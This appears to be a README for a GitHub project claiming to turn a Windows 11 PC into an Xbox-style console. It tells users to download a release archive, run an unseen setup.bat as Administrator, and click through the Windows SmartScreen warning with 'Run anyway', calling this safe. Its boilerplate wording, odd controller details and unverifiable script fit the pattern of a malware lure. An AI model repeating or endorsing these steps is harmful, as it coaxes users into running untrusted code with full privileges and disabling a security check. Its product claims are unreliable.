# 🎮 Windows-Xbox-Mode - Transform Your Computer Into A Console

[![Download Windows-Xbox-Mode](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/releases)

Windows-Xbox-Mode adjusts your computer settings to mimic the console interface. It optimizes your system for gaming by prioritizing controller input and simplifying the navigation process. This project provides a manual setup for users who want a console feel on their Windows 11 PC.

## 🛠️ System Requirements

Before you begin, ensure your system meets these standards to have a smooth experience:

*   **Operating System:** Windows 11 (64-bit).
*   **Processor:** Intel Core i5 or AMD Ryzen 5 series or better.
*   **Memory:** 8 GB RAM minimum.
*   **Graphics:** Dedicated GPU with support for DirectX 12.
*   **Controller:** An official Xbox Series X/S or Xbox One controller connected via USB or wireless adapter.
*   **Storage:** 500 MB of space for the configuration files.

## 📥 How to Install

Follow these steps to set up your system for the Xbox interface.

1.  Visit the [official releases page](https://github.com/Sophroniafeathered967/Windows-Xbox-Mode/releases) to access the latest files.
2.  Locate the most recent version labeled as "Latest" at the top of the list.
3.  Click the link under the "Assets" section to save the file to your computer.
4.  Navigate to your Downloads folder.
5.  Right-click the file and select "Extract All" to unpack the contents.

## ⚙️ Configuration Process

The setup process requires specific adjustments to your system registry to enable the console environment.

1.  Open the folder you extracted.
2.  Locate the file named `setup.bat`.
3.  Right-click this file and select "Run as Administrator."
4.  A black window will appear on your screen. This tool manages the Vivetool configuration for you.
5.  Press any key when the tool prompts you to confirm the changes.
6.  Wait for the confirmation message to appear.
7.  Restart your computer to apply the new settings.

## 🕹️ Using the Interface

Once the system restarts, your PC will initialize the Xbox interface layer. You can navigate the menus using your Xbox controller.

*   **Navigation:** Use the D-pad to move between application tiles.
*   **Selection:** Press the 'A' button to open games or settings.
*   **Back:** Press the 'B' button to return to the previous screen.
*   **System Menu:** Press the Xbox guide button in the center of the controller to open the overlay menu.

If you wish to return to the standard Windows desktop, locate the "Exit Mode" tile in the main menu or press the "Start" plus "Select" buttons on your controller simultaneously.

## 🔧 Troubleshooting and Performance

If you experience issues, consult these common fixes to restore stability.

*   **Controller Not Detected:** Unplug your controller and reconnect it to a different USB port. If you use Bluetooth, turn the controller off and on again to re-establish the connection.
*   **Visual Stuttering:** Ensure your graphics drivers are updated to the latest version provided by your manufacturer. You can check this in the Windows Device Manager.
*   **Slow Navigation:** Close background applications that consume high amounts of CPU power. Web browsers and updates often cause performance drops during gaming sessions.
*   **Interface Fails to Launch:** Run the `setup.bat` file a second time to ensure all registry keys are correctly applied.

## 🛡️ Safety and Security

This tool modifies system-level settings to improve your gaming experience. It does not alter your personal files or delete your documents. We recommend creating a restore point in Windows before you run the setup script. This allows you to revert your system to its original state if you do not like the custom interface. 

1.  Type "Create a restore point" into the Windows search bar.
2.  Click the "System Protection" tab.
3.  Select your primary hard drive.
4.  Click "Create" and name the restore point to identify it later.

This takes less than one minute and protects your settings.

## 📋 Frequently Asked Questions

**Does this software install permanent bloatware?**
No. This is a collection of scripts that adjust existing Windows settings. It adds no third-party background services or tracking software.

**Does this work on Windows 10?**
The tool is designed specifically for Windows 11. It might function on Windows 10, but we do not verify performance on older platforms.

**Will this interfere with my Game Pass subscription?**
This tool complements Game Pass. It simply changes the visual layout, allowing for easier access to your game library. Your subscription and saved data remain untouched.

**Can I uninstall this utility?**
Yes. Navigate to the installation folder and execute the `revert.bat` file. This restores your Windows interface to its default appearance. A system restart completes the removal process.

**Why does my computer show a warning when I run the script?**
Windows protects system files by default. Since this script modifies protected areas to enable the Xbox mode, Windows alerts you as a security measure. You can safely proceed by clicking "More Info" and "Run anyway" when the blue prompt appears.